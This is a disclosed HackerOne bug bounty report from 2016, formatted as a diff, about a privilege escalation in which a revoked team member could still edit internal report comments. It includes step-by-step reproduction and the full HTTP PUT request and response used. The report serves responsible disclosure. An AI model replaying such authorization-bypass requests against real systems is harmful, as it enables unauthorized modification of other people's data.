@@ -1,0 +1,44 @@
+ReportLink:https://hackerone.com/reports/119221
+WeaknessName:Privilege Escalation
+Reporter:https://hackerone.com/techguynoob
+ReportedTo:HackerOne(security)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:01.04.2016 10:56:51
+
+Summary:
+
+Poc :
+
+1.Login into Program(testbug) as Alice account
+2.Create a new group with "Read-only" Permission . Add a Bob to that group
+3.Bob report a bug to Program(testbug) After Post "Some Internal comments"
+4.Now Alice Revoke the Bob team access permissions so `Bob is no longer part of the team`
+5.Bob escalate his privileges to edit the Internal comment Activities on Bug Reports by following Request 
+
+PUT /activities/815794 HTTP/1.1
+Host: hackerone.com
+Connection: close
+Content-Length: 402
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: https://hackerone.com
+<redacted>
+
+{"id":815794,"is_internal":true,"editable":true,"type":"Activities::Comment","message":"bugtested","markdown_message":"<p>bugtested</p>\n","automated_response":false,"created_at":"2016-02-28T02:51:41.488Z","updated_at":"2016-02-28T02:51:41.488Z","actor":{"username":"Bob","url":"https://hackerone.com/Bob","profile_picture_urls":{"medium":"/assets/avatars/default-9e818ea07a7aa609d7d6dfa75612832e.png"}}}
+
+
+Response :
+
+HTTP/1.1 200 OK
+Server: cloudflare-nginx
+Date: Sun, 28 Feb 2016 02:53:28 GMT
+Content-Type: application/json; charset=utf-8
+Connection: close
+Status: 200 OK
+<redacted>
+
+{"id":815794,"is_internal":true,"editable":true,"type":"Activities::Comment","message":"bugtested","markdown_message":"\u003cp\u003ebugtested\u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-28T02:51:41.488Z","updated_at":"2016-02-28T02:53:28.728Z","actor":{"username":"Bob","url":"https://hackerone.com/Bob","profile_picture_urls":{"medium":"/assets/avatars/default-9e818ea07a7aa609d7d6dfa75612832e.png"}}}
+
+Regards,
+techguynoob
